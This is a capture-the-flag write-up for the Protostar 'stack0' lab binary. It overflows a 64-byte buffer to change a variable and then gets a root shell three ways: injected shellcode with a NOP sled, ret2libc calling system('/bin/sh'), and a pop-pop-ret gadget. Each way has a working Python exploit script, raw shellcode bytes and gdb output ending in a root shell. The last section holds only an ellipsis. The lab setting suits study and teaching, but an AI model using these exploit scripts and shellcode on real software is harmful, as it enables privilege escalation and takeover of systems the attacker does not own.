# stack0

## solution
Disassemble main in `radare2` so we can see the locations (relative to %esp) of the `s` and
`var_8h` variables. 
```
[0x08048340]> pdf @main
            ; DATA XREF from entry0 @ 0x8048357
┌ 65: int main (int argc, char **argv, char **envp);
│           ; var char *s @ esp+0x1c
│           ; var int32_t var_8h @ esp+0x5c

...
```

We can then calculate the distance from the variable `s` to the variable `var_8h` to find the
length of the buffer.
```
>>> 0x5c - 0x1c
64
```

To solve the challenge, we just need to change the `var_8h` variable to anything other than 0. Here
we'll change it to `42424242`.
```
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"BBBB"' | ./stack0
you have changed the 'modified' variable
```

## shells

### classic buffer overflow
First we need to find the offset from the start of the buffer to the %eip register, so we can
redirect process execution. We can do this by giving it a known pattern of bytes, in this case
`BBBBCCCCDDDD`, and so on.
```
(gdb) r
Starting program: /opt/protostar/bin/stack0 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
you have changed the 'modified' variable

Program received signal SIGSEGV, Segmentation fault.
0x46464646 in ?? ()
```

Since %eip was overwritten with `46464646` the offset is easily calculated as 80 bytes.

```py
import struct

off = 80

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0xbffff740 + off + 0x80)

print pad + ret + nop + buf 
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack0
you have changed the 'modified' variable
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2libc
First we need to find the address of `system` within memory. We can do this within gdb.
```
(gdb) b main
Breakpoint 1 at 0x80483fd: file stack0/stack0.c, line 10.
(gdb) r
Starting program: /opt/protostar/bin/stack0 

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack0/stack0.c:10
10	stack0/stack0.c: No such file or directory.
	in stack0/stack0.c
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

We also need to find the address of libc itself, we can also do this within gdb.
```
(gdb) info proc map
process 2051
cmdline = '/opt/protostar/bin/stack0'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack0'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack0
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack0
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fde000 0xb7fe2000     0x4000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
```

We then need to find the offset of "/bin/sh" within libc. We can do this using a combination of
`strings` and `grep`.
```
user@protostar:/opt/protostar/bin$ strings /lib/libc.so.6 -t x | grep '/bin/sh'
 11f3bf /bin/sh
```

```py
import struct

off = 80

pad = 'A' * off

system = struct.pack('I', 0xb7ecffb0)
bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

print pad + system + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack0
you have changed the 'modified' variable
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to shellcode
First we need to find a POP, POP, RET gadget in the target binary. We can do this with
`msfelfscan`.
```
➜  stack git:(master) ✗ msfelfscan -s -f stack0
0x080484a7   edi ebp ret
0x080483c2   ebx ebp ret
0x080484d7   ebx ebp ret
```

```py
import struct

off = 80

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0x080484a7)

ret += 'AAAA'                                    # POP
ret += 'AAAA'                                    # POP
ret += struct.pack('I', 0xbffff740 + off + 0x80) # RET

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack0
you have changed the 'modified' variable
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to libc
...
